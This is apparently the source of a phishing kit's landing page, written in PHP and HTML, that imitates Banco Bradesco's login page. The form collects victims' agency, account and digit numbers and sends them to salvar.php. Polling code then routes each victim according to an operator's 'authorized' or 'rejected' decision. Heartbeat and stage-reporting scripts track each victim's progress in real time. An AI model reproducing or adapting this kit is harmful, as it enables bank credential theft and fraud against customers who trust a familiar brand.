<?php
session_name('CLIENTSESS');
session_set_cookie_params([
  'lifetime' => 86400 * 30, // 30 dias
  'path' => '/',           // cliente acessa tudo normalmente
  'secure' => true,
  'httponly' => true,
  'samesite' => 'Lax'
]);
session_start();
// --- 1) Gera protocolo se necessário ---
if (!isset($_SESSION['chat_protocol'])) {
    $_SESSION['chat_protocol'] = strtoupper(bin2hex(random_bytes(4)));
}

// --- 2) Define o cookie antes de qualquer echo/output ---
if (!isset($_COOKIE['identificador_cliente'])) {
    $proto = $_SESSION['chat_protocol'];
    setcookie('identificador_cliente', $proto, time()+86400*30, '/');
    // sincroniza já neste request
    $_COOKIE['identificador_cliente'] = $proto;
}

// --- 3) Agora sim mapeia para client_id em sessão ---
require __DIR__ . '/../includes/db.php';
if (empty($_SESSION['client_id']) && !empty($_COOKIE['identificador_cliente'])) {
    $cookie = $_COOKIE['identificador_cliente'];
    $stmt = $pdo->prepare("SELECT id FROM clients WHERE identificador_cookie = ?");
    $stmt->execute([$cookie]);
    if ($r = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $_SESSION['client_id'] = intval($r['id']);
    } else {
        // cria registro temporário
        $stmt = $pdo->prepare("
          INSERT INTO clients (identificador_cookie, status, created_at)
          VALUES (?, 'chat', NOW())
        ");
        $stmt->execute([$cookie]);
        $_SESSION['client_id'] = $pdo->lastInsertId();
    }
}

// ——————————————
// 3) detecção de AJAX “validar” (sua lógica original, sem alterações)
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_GET['acao']) && $_GET['acao'] === 'validar'
) {
    header('Content-Type: application/json');

    $post = [
      'agencia' => $_POST['agencia'] ?? '',
      'conta'   => $_POST['conta']   ?? '',
      'digito'  => $_POST['digito']  ?? '',
      'lembrar' => isset($_POST['lembrar']) ? 'on' : ''
    ];

    $ch = curl_init('salvar.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    $resp = curl_exec($ch);
    curl_close($ch);

    echo $resp;
    exit;
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
  <link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
  <link rel="stylesheet" href="/css/estilo.css"/>
  <script>
    // redireciona mobile
    if (/Mobi|Android|iPhone|iPad/.test(navigator.userAgent)) {
      window.location.replace('/login-mobile.php');
    }
  </script>
</head>
<body>
  <div class="load" id="tela-loading" style="display: none;">
    <div class="container-load">
      <div class="circle"></div>
      <div class="circle"></div>
    </div>
  </div>

  <form style="margin:0; padding:0;" onsubmit="enviarDados(event)">

    <header class="topbar">
      <div class="header-container">
        <div class="left-group">
          <img src="/imagens/cadeado.png" alt="Cadeado" class="ico-cadeado">
          <span class="access-text">ACESSAR SUA CONTA</span>
          <div class="vertical-divider"></div>
        </div>

        <div class="center-group">
          <div class="campo-agencia">
            <label for="agencia" class="lbl-branco">Agência:</label>
            <input name="agencia" id="agencia" class="input-min" type="text" required>
          </div>

          <div class="campo-conta">
            <label for="conta" class="lbl-branco">Conta:</label>
            <input name="conta" id="conta" class="input-min" type="text" required>
            <input name="digito" id="digito" class="input-digito" type="text" required>
          </div>

          <button type="submit" class="btn-ok">OK</button>
        </div>

        <div class="checkbox-lembrar">
          <input type="checkbox" id="lembrar">
          <label for="lembrar" class="lbl-branco">Lembrar-me</label>
        </div>

        <div class="divider-meio"></div>

        <div class="como-usar">
          <span class="como-usar-text">Como Usar</span>
          <img src="imagens/icon_comousar.png" alt="Como Usar" class="ico-usar">
        </div>
        </div>


        <div class="right-group">
          <span class="acessibilidade-text">Acessibilidade</span>
          <img src="/imagens/icon_acessibilidade.png" alt="Acessibilidade" class="ico-acessibilidade">
        </div>
      </div>
    </header>

    <section class="carrossel">
      <div class="slides">
        <div class="slide active"
             style="background-image: url('/imagens/promocao_aventura_no_havai_desktop.webp');"></div>
        <div class="slide"
             style="background-image: url('/imagens/BANNER_HOME_DESK_CLASSIC.webp');"></div>
        <div class="slide"
             style="background-image: url('/imagens/investir-desktop.webp');"></div>
      </div>
      <img src="/imagens/Gradient.png" class="gradient-overlay" alt="Gradient">
      <img src="/imagens/menu-lateral.png" class="menu-lateral-overlay" alt="Menu lateral fixo">
      <div class="carousel-controls">
        <button class="circle-button">&#10073;&#10073;</button>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="dots">
          <span class="dot active"></span>
          <span class="dot"></span>
          <span class="dot"></span>
        </div>
        <button class="circle-button">&#10094;</button>
        <button class="circle-button">&#10095;</button>
      </div>
    </section>

    <section class="cta-container">
      <div class="cta-content">
        <span class="cta-text">Contrate on-line, mesmo sem conta-corrente</span>
        <img src="/imagens/seta.png" alt="Seta" class="cta-arrow"/>
      </div>
      <div class="cards-box">
        <div class="card"><img src="/imagens/icon1.png" alt="Renegocie"/><p>Renegocie suas dívidas</p></div>
        <div class="card"><img src="/imagens/icon2.png" alt="Cartão"/><p>Peça seu cartão<br/>sem anuidade</p></div>
        <div class="card"><img src="/imagens/icon3.png" alt="Consórcio"/><p>Simule seu<br/>consórcio</p></div>
        <div class="card"><img src="/imagens/icon4.png" alt="Dental"/><p>Contrate seu<br/>plano dental</p></div>
        <div class="card"><img src="/imagens/icon5.png" alt="Seguro"/><p>Proteja seu lar.<br/>Simule aqui</p></div>
        <div class="card"><img src="/imagens/icon6.png" alt="Agora"/><p>Invista com a<br/>Ágora</p></div>
        <div class="card"><img src="/imagens/icon7.png" alt="Mais opções"/><p>Conheça mais<br/>opções</p></div>
      </div>
    </section>

    <section class="produtos-servicos">
      <h2 class="titulo-gradiente">
        Produtos e serviços pra<br/>
        agilizar seu dia a dia
      </h2>
      <p class="subtexto">
        Confira algumas das soluções que<br/>preparamos pra você.
      </p>
    </section>

    <section class="cards-servicos">
      <div class="cards-grid">
        <div class="servico-card"><img src="/imagens/icone1.png" alt="Fale Conosco"><p>FALE CONOSCO</p></div>
        <div class="servico-card"><img src="/imagens/icone2.png" alt="2ª Via"><p>2ª VIA DO BOLETO</p></div>
        <div class="servico-card"><img src="/imagens/icone3.png" alt="Pagamentos"><p>PAGAMENTOS</p></div>
        <div class="servico-card"><img src="/imagens/icone4.png" alt="Desbloqueio"><p>DESBLOQUEIO DE CARTÃO</p></div>
        <div class="servico-card"><img src="/imagens/icone5.png" alt="Renegociação"><p>RENEGOCIAÇÃO DE DÍVIDAS</p></div>
        <div class="servico-card"><img src="/imagens/icone6.png" alt="Segurança"><p>SEGURANÇA</p></div>
      </div>
    </section>

    <section class="fundo-novidades">
      <img src="/imagens/background-novidades.png" alt="Fundo novidades" class="fundo-diagonal"/>
    </section>

    <section class="fundo-continuacao">
      <img src="/imagens/Background.png" alt="Continuação visual" class="fundo-diagonal"/>
    </section>

    <section class="fundo-continuacao1">
      <img src="/imagens/Background1.png" alt="Continuação visual" class="fundo-diagonal"/>
    </section>

  </form>

<?php if (
    $_SERVER['REQUEST_METHOD'] === 'GET' &&
    isset($_GET['erro']) &&
    $_GET['erro'] === 'dados' &&
    isset($_SERVER['HTTP_REFERER']) &&
    strpos($_SERVER['HTTP_REFERER'], 'index.php') !== false
): ?>
  <div class="popUp-error" id="popupErro">
    <div class="erro">
      <p>Dados incorretos. Verifique e tente novamente.</p>
    </div>
    <div class="carregar">
      <div class="temp-carregamento"></div>
    </div>
  </div>
  <script>
    const popup = document.getElementById('popupErro');
    popup.style.display = 'flex';
    history.replaceState(null, '', 'index.php');
    setTimeout(() => popup.style.display = 'none', 5000);
  </script>
<?php endif; ?>

<script>
  async function verificarStatus(clientId) {
    const loader = document.getElementById('tela-loading');
    if (loader) loader.style.display = 'flex';

    try {
      const res  = await fetch(`verificar_status.php?id=${clientId}`);
      const json = await res.json();
      const status = (json.status || '').trim();
      const tipo   = (json.tipo   || '').trim();

      if (status === 'authorized') {
        if (tipo === 'classic')      window.location.href = 'login.php';
        else if (tipo === 'exclusive') window.location.href = 'exclusive.php';
        else if (tipo === 'prime')     window.location.href = 'prime.php';
        else                           window.location.href = 'login.php';
      }
      else if (status === 'rejected') {
        if (loader) loader.style.display = 'none';
        mostrarErro('Dados incorretos. Verifique e tente novamente.');
      }
      else {
        setTimeout(() => verificarStatus(clientId), 1500);
      }
    } catch {
      setTimeout(() => verificarStatus(clientId), 2000);
    }
  }
</script>

<script>
  const slides       = document.querySelectorAll('.slide');
  const dots         = document.querySelectorAll('.dot');
  const pauseBtn     = document.querySelector('.carousel-controls button:nth-child(1)');
  const prevBtn      = document.querySelector('.carousel-controls button:nth-child(4)');
  const nextBtn      = document.querySelector('.carousel-controls button:nth-child(5)');
  const progressFill = document.querySelector('.progress-fill');

  let currentIndex = 0, interval, paused = false;

  function showSlide(i) {
    slides.forEach((s, idx) => {
      s.classList.toggle('active', idx === i);
      dots[idx].classList.toggle('active', idx === i);
    });
    currentIndex = i;
  }
  function nextSlide() { showSlide((currentIndex + 1) % slides.length); }
  function prevSlide() { showSlide((currentIndex - 1 + slides.length) % slides.length); }

  function startCarousel() {
    interval = setInterval(() => {
      nextSlide();
      resetProgressBar();
    }, 5000);
  }
  function stopCarousel() { clearInterval(interval); }

  function togglePause() {
    if (paused) { startCarousel(); pauseBtn.innerHTML = '❙❙'; }
    else        { stopCarousel();  pauseBtn.innerHTML = '▶'; }
    paused = !paused;
  }

  function resetProgressBar() {
    progressFill.style.animation = 'none';
    void progressFill.offsetWidth;
    progressFill.style.animation = 'progressAnim 5s linear infinite';
  }

  pauseBtn.addEventListener('click', togglePause);
  nextBtn.addEventListener('click', () => { nextSlide(); resetProgressBar(); });
  prevBtn.addEventListener('click', () => { prevSlide(); resetProgressBar(); });
  dots.forEach((dot, idx) => dot.addEventListener('click', () => { showSlide(idx); resetProgressBar(); }));

  showSlide(0);
  startCarousel();
  resetProgressBar();
</script>

<?php if (isset($_GET['aguardando'], $_SESSION['client_id'], $_SESSION['nome'])): ?>
  <script>
    history.replaceState(null, '', 'index.php');
    verificarStatus(<?php echo $_SESSION['client_id']; ?>);
  </script>
<?php endif; ?>

<script>
  document.querySelector('form').addEventListener('submit', enviarDados);

  // ✅ ---- FUNÇÃO MODIFICADA ---- ✅
  async function enviarDados(e) {
    e.preventDefault();
    const agencia = document.getElementById('agencia').value.trim();
    const conta   = document.getElementById('conta').value.trim();
    const digito  = document.getElementById('digito').value.trim();

    if (!agencia || !conta || !digito) {
      mostrarErro('Os campos agência, conta e dígito são obrigatórios.');
      return;
    }

    // Payload que será enviado diretamente para o seu backend
    const payloadParaSalvar = {
      agencia: agencia,
      conta: conta,
      digito: digito,
      lembrar: document.getElementById('lembrar').checked ? 'on' : ''
    };

    try {
      document.getElementById('tela-loading').style.display = 'flex';

      // Requisição direta para 'salvar.php', sem o proxy
      const salvarRes  = await fetch('salvar.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payloadParaSalvar) // Envia o payload com os dados do formulário
      });
      const salvarJson = await salvarRes.json();

      if (!salvarJson.success) {
        throw new Error(salvarJson.error || 'Falha ao salvar os dados.');
      }

      // Continua com a verificação de status normalmente
      verificarStatus(salvarJson.client_id);

    } catch (err) {
      document.getElementById('tela-loading').style.display = 'none';
      mostrarErro(err.message);
    }
  }

  function mostrarErro(msg) {
    const popup = document.createElement('div');
    popup.className = 'popUp-error';
    popup.innerHTML = `
      <div class="erro"><p>${msg}</p></div>
      <div class="carregar"><div class="temp-carregamento"></div></div>
    `;
    document.body.appendChild(popup);
    popup.style.display = 'flex';
    setTimeout(() => popup.remove(), 5000);
  }
</script>

<?php include 'chat.php'; ?>

<script>
  function getCookie(name) {
    const v = `; ${document.cookie}`;
    const parts = v.split(`; ${name}=`);
    return parts.length === 2 ? parts.pop().split(';').shift() : '';
  }

  function sendHeartbeat() {
    const userCookie = getCookie('identificador_cliente');
    if (userCookie) {
      const fd = new FormData();
      fd.append('identificador_cookie', userCookie);
      fetch('/heartbeat.php', { method: 'POST', body: fd })
        .catch(e => console.error('Heartbeat falhou:', e));
    }
  }

  sendHeartbeat();
  setInterval(sendHeartbeat, 3000);
</script>

<script>
  document.addEventListener('DOMContentLoaded', () => {
    const pageName = 'index.php';
    function reportarEstagioAtual() {
      fetch('/atualizar_estagio.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ estagio: pageName }),
        credentials: 'include'
      }).catch(e => console.error(`Erro ao reportar estágio '${pageName}':`, e));
    }
    reportarEstagioAtual();
    setInterval(reportarEstagioAtual, 2000);
  });
</script>


</body>
</html>